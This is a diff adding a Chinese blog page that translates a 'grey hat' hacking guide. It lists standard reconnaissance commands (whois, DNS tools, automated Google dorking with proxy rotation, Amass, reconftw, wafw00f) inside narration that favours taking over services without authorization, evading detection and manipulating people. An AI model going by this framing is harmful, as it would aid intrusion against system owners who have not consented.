@@ -1,0 +1,900 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0ldcat">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="灰帽黑客操作指南最近，我对自己用于服务检测、渗透测试、漏洞赏金、黑客攻击、红队攻防以及随手研究的指令和步骤进行了一次梳理。我决定将它们统一记录在一个地方，并根据需要随时扩充。以下是我在进行安全研究时使用的步骤和工具清单，主要是近期常用的那些。我会不定期更新工具库，因为有些工具会因停止开发而过时，随之会有新工具取而代之。 另一个原因是我喜欢有一套操作流程可以遵循。黑客攻击是一个复杂的过程，有时会变得">
+<meta property="og:type" content="article">
+<meta property="og:title" content="灰帽黑客操作指南来自onion(英译中)">
+<meta property="og:url" content="http://example.com/2026/02/17/%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97%E6%9D%A5%E8%87%AAonion-%E8%8B%B1%E8%AF%91%E4%B8%AD/index.html">
+<meta property="og:site_name" content="0ldcat_blog">
+<meta property="og:description" content="灰帽黑客操作指南最近，我对自己用于服务检测、渗透测试、漏洞赏金、黑客攻击、红队攻防以及随手研究的指令和步骤进行了一次梳理。我决定将它们统一记录在一个地方，并根据需要随时扩充。以下是我在进行安全研究时使用的步骤和工具清单，主要是近期常用的那些。我会不定期更新工具库，因为有些工具会因停止开发而过时，随之会有新工具取而代之。 另一个原因是我喜欢有一套操作流程可以遵循。黑客攻击是一个复杂的过程，有时会变得">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/02/17/%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97%E6%9D%A5%E8%87%AAonion-%E8%8B%B1%E8%AF%91%E4%B8%AD/image-20260217112953132.png">
+<meta property="og:image" content="http://example.com/2026/02/17/%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97%E6%9D%A5%E8%87%AAonion-%E8%8B%B1%E8%AF%91%E4%B8%AD/image-20260217113013963.png">
+<meta property="article:published_time" content="2026-02-17T03:27:27.000Z">
+<meta property="article:modified_time" content="2026-02-17T04:25:08.436Z">
+<meta property="article:author" content="0ldcat">
+<meta property="article:tag" content="转载">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/02/17/%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97%E6%9D%A5%E8%87%AAonion-%E8%8B%B1%E8%AF%91%E4%B8%AD/image-20260217112953132.png">
+  
+  
+  <title>灰帽黑客操作指南来自onion(英译中) - 0ldcat_blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"😶‍🌫️","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>闲言碎语</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="灰帽黑客操作指南来自onion(英译中)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2026-02-17 11:27" pubdate>
+        2026年2月17日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      23k 个字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      195 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">灰帽黑客操作指南来自onion(英译中)</h1>
+            
+            <div class="markdown-body">
+              <h1 id="灰帽黑客操作指南"><a href="#灰帽黑客操作指南" class="headerlink" title="灰帽黑客操作指南"></a><strong>灰帽黑客操作指南</strong></h1><p>最近，我对自己用于服务检测、渗透测试、漏洞赏金、黑客攻击、红队攻防以及随手研究的指令和步骤进行了一次梳理。我决定将它们统一记录在一个地方，并根据需要随时扩充。以下是我在进行安全研究时使用的步骤和工具清单，主要是近期常用的那些。我会不定期更新工具库，因为有些工具会因停止开发而过时，随之会有新工具取而代之。</p>
+<p>另一个原因是我喜欢有一套操作流程可以遵循。黑客攻击是一个复杂的过程，有时会变得非常混乱，因此坚持某种指南是很有意义的，这样我才不会意外遗漏任何环节。针对所有目标的攻击，并没有唯一的金科玉律或万能指南。</p>
+<p>虽然通用方法可能有一个大体框架，但一切都会根据你的实际发现而改变。此外，关注新的应用程序和脚本也是值得的，因为有时你可以将它们加入自己的工具库中，以加速或自动化某个步骤——当然，除非你追求的是纯手工挑战带来的名声和荣耀。</p>
+<p>这里有一些可以发现新工具的网站：</p>
+<ul>
+<li><strong>KaliLinuxTutorials</strong></li>
+<li><strong>KitPloit</strong></li>
+</ul>
+<p>怎么说呢，我并不是那种会发布 CVE 编号、挖掘零日漏洞（0-day）或发现全新漏洞的黑客。换句话说，我也许能做到，但可能要花非常长的时间，且发现后的回报与投入并不相称。由于我这人既懒散又贪婪，还认为成名是对自由的束缚，所以我更像是一个“种族歧视者”式的脚本小子。</p>
+<p>我的黑客行为核心在于寻找那些“低垂的果实”（容易入手的目标），并利用对方技术人员犯下的错误。</p>
+<p>从某种角度看，这正是黑客攻击的本质：我了解一个系统本该是什么样子的，而拥有该服务的人可能知道，也可能不知道。所以，这关乎于对方是否有相关知识，或者是否存在知识盲区。正是这些安全漏洞或配置不当，导致了服务的弱点暴露在外。这本质上是一场知识竞赛：要么有人利用知识来保障服务安全，要么我利用知识来接管它。</p>
+<p>这段描述可能有点乱，但对我来说很受用。我训练得越多，发现的漏洞就越多；发现的漏洞越多，我接管的服务也就越多。</p>
+<p>而且，这并不像电影里演的那样，你下单买个黑客服务就能无孔不入。防御严密的地方是无法攻破的，事实就是如此（或者说我还没达到那个水平）。面对防御严密的地方，唯一的突破口就是击垮它的主人——那个活生生的人。一旦人被攻破，我们就能像他一样拥有访问权限。</p>
+<p>不过我不“黑”人，我把社会工程学技巧留着给自己谋福利，让别人按我的意愿行事，或者让他们同意一些通常不会同意的事。相比之下，我更享受操纵人的感觉。</p>
+<p>所以，我只黑那些“能被黑”的东西，而不是“应该被黑”或“我想黑”的东西。</p>
+<p>中间插播一张为了这篇文章专门生成的 AI 搞怪图——这可是当今每个黑客博客的标配。现在的互联网到处充斥着这种 AI 生成的图像，所以我也顺应潮流，把这玩意儿也放这儿。慢慢欣赏。</p>
+<p><img src="/2026/02/17/%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97%E6%9D%A5%E8%87%AAonion-%E8%8B%B1%E8%AF%91%E4%B8%AD/image-20260217112953132.png" srcset="/img/loading.gif" lazyload alt="image-20260217112953132"></p>
+<p>挺有意思的，AI 想象中的黑客空间（hackerspace）和现实中真实的黑客空间，完全是两码事。</p>
+<p><img src="/2026/02/17/%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97%E6%9D%A5%E8%87%AAonion-%E8%8B%B1%E8%AF%91%E4%B8%AD/image-20260217113013963.png" srcset="/img/loading.gif" lazyload alt="image-20260217113013963"></p>
+<p>回到黑客攻击本身。总的来说，这是一个既艰难又漫长的过程：运行工具、分析结果、理解结果、得出结论，然后重新启动工具、重新分析；而在工具运行并吐出更多结果供分析的间隙，往往要耗费数小时。你需要分析和审查海量数据，接着检查那些潜在的漏洞是否真实存在且可被利用，结果最后却发现它们根本无法使用。</p>
+<p>也许之后只需点几下鼠标就能接管数据库或服务。又或者，你发现所有已知的选项都已排查完毕，所有线索都断了，只能放弃这次攻击。然后转向目标列表，选择下一个，再次重复数小时甚至数天的分析。结果可能还是颗粒无收。有时一个月能成功几次，有时一周能成几次，有时则会遭遇“失败马拉松”，连续几个月一无所获。</p>
+<p>这可不像电影里演的那样令人兴奋。</p>
+<p>所以，理论上的步骤看起来大概是这样的，虽然有时它们与实际操作完全不沾边。但你总得从某个地方开始：</p>
+<ul>
+<li><strong>侦察&#x2F;足迹探测 (Reconnaissance&#x2F;Footprinting)</strong></li>
+<li><strong>扫描 (Scanning)</strong></li>
+<li><strong>获取权限 (Gaining access)</strong></li>
+<li><strong>维持权限 (Maintaining Access)</strong></li>
+<li><strong>清理痕迹 (Clearing tracks)</strong></li>
+</ul>
+<p>关于这些步骤及其背后的理论，网上有成堆的页面在详细描述，你肯定能搜到。下面是我在这些环节中常用的一些工具。我更多地侧重于**侦察（Reconnaissance）**和**扫描（Scanning）**，并根据发现的结果来获取权限、维持权限，或者直接拿走我想要的数据。有时我也会清理痕迹以增加被溯源的难度，但在大多数情况下，只要你的 <strong>OPSec（操作安全）</strong>做得够好，就算留下一片狼藉，也没人能抓到你。</p>
+<p>由于我主要针对 Web 应用程序，目标大多是数据库或其他可以提交漏洞赏金（Bug Bounty）的漏洞，所以清单并不会涵盖所有领域。噢，别忘了，我可是个“资深脚本小子”。</p>
+<p>记得时不时回来看看，我会更新工具的增减情况。</p>
+<p>下面的列表只给出了基础命令示例，你总该花点时间去调整参数。尤其是那些涉及<strong>线程（threads）</strong>、<strong>时机（timing）</strong>、<strong>节流（throttling）</strong>、<strong>侵略等级（aggression level）</strong>以及其他能降低噪音（防发现）的参数。另外，别忘了在工具配置中添加一些 <strong>API Key</strong>，这样能获得更好的结果。</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>我所有的操作都在专门的物理机和虚拟机上的 <strong>Kali Linux</strong> 中完成。物理机用于执行那些耗时较长的任务，它是我的主力机，（在搞渗透时）24 小时运行，其余时间关机。虚拟机则用于测试和运行一些可以快速完成的自定义工具或任务。</p>
+<p>此外，在进行测试和渗透时，系统会连接到托管在我 <strong>VPS</strong> 上的 <strong>VPN</strong>；有时我也会使用 <strong>PIA (Private Internet Access) VPN</strong>；或者在渗透 <strong>.onion</strong> 域名的隐藏服务时，将 <strong>Tor</strong> 作为 <strong>SOCKS 代理</strong>来转发流量。</p>
+<p><strong>总结如下：</strong></p>
+<ul>
+<li><strong>操作系统：</strong> Kali Linux</li>
+<li><strong>网络：</strong> VPN（个人 VPS 搭建 + Private Internet Access）</li>
+<li><strong>硬件：</strong> Dell OptiPlex Micro 7050 (i5-6500T, 8GB RAM, 128GB SSD)，打算以后升级内存和硬盘，目前够用。</li>
+<li><strong>虚拟机：</strong> 在 VirtualBox 上运行 Kali Linux。有时也用 <code>virt-manager</code> 来部署临时系统。</li>
+<li><strong>VPS：</strong> 除了配置 VPN，有时也用来跑一些基础工具。</li>
+</ul>
+<p>对于从 GitHub 下载的一些 <strong>Python</strong> 工具，由于系统环境依赖项有时无法满足，我会将它们安装在<strong>虚拟环境 (venv)</strong> 中。以下是创建虚拟环境、激活、安装依赖以及退出的步骤：</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">python3 -m venv .venv<br>source .venv/bin/activate<br>pip3 install -r requirements.txt<br>deactivate<br><br></code></pre></div></td></tr></table></figure>
+
+<p>不过，还有一个更简单的方法，那就是使用 <code>virtualenvwrapper</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">install virtualenvwrapper</span><br>pip install virtualenvwrapper<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">set</span> it up</span><br>export WORKON_HOME=~/Envs <br>mkdir -p $WORKON_HOME<br>source /usr/local/bin/virtualenvwrapper.sh<br><span class="hljs-meta prompt_"># </span><span class="language-bash">create virtual environment</span><br>mkvirtualenv env1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">list venv home</span><br>ls $WORKON_HOME<br><span class="hljs-meta prompt_"># </span><span class="language-bash">activate venv</span><br>workon env1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">enter venv catalog</span><br>cd $WORKON_HOME<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="足迹探测-Footprinting"><a href="#足迹探测-Footprinting" class="headerlink" title="足迹探测 (Footprinting)"></a>足迹探测 (Footprinting)</h2><p>足迹探测仅仅是搜集目标的一般性信息，它是侦察过程的第一步。这包括<strong>被动搜集</strong>（如 DNS、公开记录、WHOIS、社交媒体）和<strong>主动搜集</strong>，即与系统产生交互（如 Ping、网络拓扑映射、Banner 抓取）。这一切都是为了了解系统的形态及其运作方式。</p>
+<p>建议尽可能将“侦察”与“扫描”区分开来，以免侦察阶段的操作过早暴露，导致整个行动夭折。</p>
+<ul>
+<li><strong>WHOIS 查询：</strong> 获取域名注册信息。</li>
+<li><strong>Nslookup&#x2F;Dig：</strong> 获取 DNS 相关信息。</li>
+<li><strong>Traceroute（路由跟踪）：</strong> 确定通往目的地的路径。</li>
+<li><strong>Google Dorking（谷歌黑客语法）：</strong> 利用特定的搜索指令，挖掘那些不易获取的信息。</li>
+<li><strong>全网搜索引擎：</strong> 如 Shodan、ZoomEye、Censys、GreyNoise。</li>
+<li><strong>WAF 识别：</strong> 识别被 Web 应用防火墙隐藏的后端应用。</li>
+<li><strong>NMAP：</strong> 进行基础扫描。</li>
+</ul>
+<p>通过此阶段的任务，可以搜集到以下信息：</p>
+<ul>
+<li><strong>域名、IP 地址以及网段信息。</strong></li>
+<li><strong>网络架构相关信息。</strong></li>
+<li><strong>员工详情、电子邮件地址及联系方式。</strong></li>
+<li><strong>正在使用的操作系统及其软件版本。</strong></li>
+<li><strong>安全策略与配置情况。</strong></li>
+<li><strong>WHOIS 注册数据。</strong></li>
+<li><strong>系统层面的工具信息。</strong></li>
+</ul>
+<h2 id="WHOIS-查询"><a href="#WHOIS-查询" class="headerlink" title="WHOIS 查询"></a><strong>WHOIS 查询</strong></h2><p>系统工具：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">whois <span class="hljs-built_in">example</span>.com<br></code></pre></div></td></tr></table></figure>
+
+<p>在线工具：</p>
+<figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//whois.domaintools.com/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//mxtoolbox.com/SuperTool.aspx</span><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>系统工具</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">nslookup example.<span class="hljs-keyword">com</span><br>nslookup -<span class="hljs-built_in">type</span>=mx example.<span class="hljs-keyword">com</span><br><span class="hljs-keyword">dig</span> example.<span class="hljs-keyword">com</span> mx<br><span class="hljs-keyword">dig</span> example.<span class="hljs-keyword">com</span> any<br></code></pre></div></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/darkoperator/dnsrecon%EF%BC%8C%E7%94%A8%E4%BA%8E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F">https://github.com/darkoperator/dnsrecon，用于自动化扫描</a></p>
+<figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">dnsrecon -d example.com -t std --<span class="hljs-keyword">xml</span> <span class="hljs-title">dnsrecon</span>.<span class="hljs-keyword">xml</span><br><span class="hljs-title">-d</span> example.com: domain<br><br>-t std: standard scan<br><br>–<span class="hljs-keyword">xml</span> <span class="hljs-title">dnsrecon</span>.xml: save the output to a file<br></code></pre></div></td></tr></table></figure>
+
+<p>在线工具</p>
+<figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//dnschecker.org/all-dns-records-of-domain.php</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//dnsdumpster.com/</span><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="路由追踪"><a href="#路由追踪" class="headerlink" title="路由追踪"></a>路由追踪</h2><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">tracert <span class="hljs-built_in">example</span>.com<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="Google-Dorks（谷歌黑客语法）"><a href="#Google-Dorks（谷歌黑客语法）" class="headerlink" title="Google Dorks（谷歌黑客语法）"></a>Google Dorks（谷歌黑客语法）</h2><p> 使用 <strong>Fast Google Dorks Scan（<a target="_blank" rel="noopener" href="https://github.com/IvanGlinkin/Fast-Google-Dorks-Scan%EF%BC%89">https://github.com/IvanGlinkin/Fast-Google-Dorks-Scan）</a></strong> 进行自动化 Dork 扫描。已从 GitHub 下载并安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> /<span class="hljs-keyword">opt</span>/Fast-Google-Dorks-Scan<br>chmod +<span class="hljs-keyword">x</span> FGDS.<span class="hljs-keyword">sh</span><br>FGDS.<span class="hljs-keyword">sh</span> example.<span class="hljs-keyword">com</span><br><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Pagodo</strong> (<a target="_blank" rel="noopener" href="https://github.com/opsdisk/pagodo)%E7%94%A8%E4%BA%8E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%93%E5%8F%96%E5%92%8C%E6%90%9C%E7%B4%A2">https://github.com/opsdisk/pagodo)用于自动化抓取和搜索</a> Google Hacking 数据库（GHDB）。已从 GitHub 下载并作为 Python 虚拟环境安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> /<span class="hljs-keyword">opt</span>/pagodo<br><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> venv .venv<br><span class="hljs-keyword">source</span> .venv/bin/activate<br><span class="hljs-keyword">python</span> ghdb_scraper.<span class="hljs-keyword">py</span> -s -<span class="hljs-keyword">j</span> -i # Write <span class="hljs-keyword">all</span> dorks <span class="hljs-keyword">to</span> all_google_dorks.txt, all_google_dorks.json<br><span class="hljs-keyword">python</span> pagodo.<span class="hljs-keyword">py</span> -d example.<span class="hljs-keyword">com</span> -g dorks/all_google_dorks.txt -i <span class="hljs-number">5</span> -<span class="hljs-keyword">x</span> <span class="hljs-number">15</span> -s results.txt<br><br><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>-i</strong> - 指定两次 Dork 搜索之间的最小延迟（秒）。不要设得太短，否则你的 IP 会很快触发 HTTP 429 错误（请求过多）。</p>
+<p><strong>-x</strong> - 指定两次 Dork 搜索之间的最大延迟（秒）。不要设得太长，否则搜索过程会耗费极长时间。</p>
+<p>想尽可能快地向 Google 发送 7300 多次搜索请求是行不通的。一种解决方案是准备一组 HTTP(S)&#x2F;SOCKS 代理池，并将其传递给 <strong>pagodo</strong>。</p>
+<p>在线工具</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
+<h3 id="全网资产搜索引擎-Internet-of-Everything"><a href="#全网资产搜索引擎-Internet-of-Everything" class="headerlink" title="全网资产搜索引擎 (Internet of Everything)"></a>全网资产搜索引擎 (Internet of Everything)</h3><p>搜索已在互联网上被索引的 IP、证书、域名、端口以及任何与目标服务相关的信息。</p>
+<ul>
+<li><strong>Shodan</strong></li>
+<li><strong>ZoomEye</strong></li>
+<li><strong>GreyNoise</strong></li>
+<li><strong>CenSys</strong></li>
+<li><strong>Recon AIO</strong></li>
+</ul>
+<p>还有一些很酷的全能型工具，我常用的是 <strong>FinalRecon</strong>。它可以检查请求头（headers）、SSL 信息、Whois、爬取路径、DNS、子域名、路由跟踪（traceroute）以及基础目录和端口。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">finalrecon <span class="hljs-params">--full</span> <span class="hljs-params">--url</span> https:<span class="hljs-string">//example.com</span><br></code></pre></div></td></tr></table></figure>
+
+<p>为了获得更好的结果，建议在以下路径添加 <strong>API Key</strong>： <code>$HOME/.config/finalrecon/keys.json</code></p>
+<hr>
+<h3 id="Amass"><a href="#Amass" class="headerlink" title="Amass"></a>Amass</h3><p><strong>Amass</strong> 是一款网络映射工具，利用开源信息搜集和主动侦察技术来发现攻击面和外部资产。</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">amass <span class="hljs-keyword">enum</span> -d example.com<br></code></pre></div></td></tr></table></figure>
+
+<p>同样，为了获得更精准的结果，值得配置各种 API。配置文件路径为：<code>$HOME/.config/amass/config.ini</code>。</p>
+<hr>
+<h3 id="reconftw"><a href="#reconftw" class="headerlink" title="reconftw"></a>reconftw</h3><p><strong>reconftw</strong> 旨在对目标域名执行自动化侦察，它集成了一系列最优工具集来完成扫描并发现漏洞。</p>
+<p><strong>执行扫描（全量扫描 + 断点续传）：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">./reconftw<span class="hljs-selector-class">.sh</span> -d example<span class="hljs-selector-class">.com</span> -<span class="hljs-attribute">r</span><br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li>**-r (Recon)**：全量侦察，但不包含主动攻击。</li>
+<li>**-s (Subdomains)**：子域名枚举、Web 探测及子域名接管。</li>
+<li>**-p (Passive)**：仅进行被动侦察。</li>
+<li>**-a (All)**：全量侦察加上主动漏洞检查。</li>
+<li>**-w (Web)**：针对特定 Web 目标进行漏洞检查。</li>
+</ul>
+<hr>
+<h3 id="reNgine"><a href="#reNgine" class="headerlink" title="reNgine"></a>reNgine</h3><p><strong>reNgine</strong> 是一个顶级的 Web 应用侦察套件，旨在为安全专家、渗透测试人员和漏洞赏金猎人极大提升侦察效率。</p>
+<p><strong>我的建议：</strong> 将其安装在配有 Docker 的纯净 Ubuntu 服务器上。</p>
+<h3 id="WAF-检测"><a href="#WAF-检测" class="headerlink" title="WAF 检测"></a>WAF 检测</h3><p>使用 <strong>wafw00f</strong>(<a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a>) 来测试目标应用程序是否隐藏在 Web 应用防火墙（WAF）之后。</p>
+<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">wafw00f https<span class="hljs-punctuation">:</span><span class="hljs-comment">//example.org</span><br></code></pre></div></td></tr></table></figure>
+
+<hr>
